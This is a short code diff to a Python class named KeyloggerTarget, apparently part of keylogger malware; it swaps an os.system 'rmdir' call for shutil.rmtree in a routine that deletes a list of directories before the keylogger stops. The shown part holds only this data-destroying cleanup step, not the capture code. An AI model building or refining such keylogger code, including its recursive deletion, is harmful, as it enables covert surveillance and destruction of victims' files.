@@ -11,6 +11,7 @@ import threading
 import random
 import requests
 import webbrowser
+import shutil
 
 
 class KeyloggerTarget:
@@ -158,7 +159,7 @@ class KeyloggerTarget:
             os.chdir("..")
             # We have to go back so that we can delete the other directories
             for each_dir in random_lst:
-                os.system(f"rmdir {each_dir}")
+                shutil.rmtree(each_dir)
                 # This deletes every directory
             sys.exit()
             # Stops the keylogger
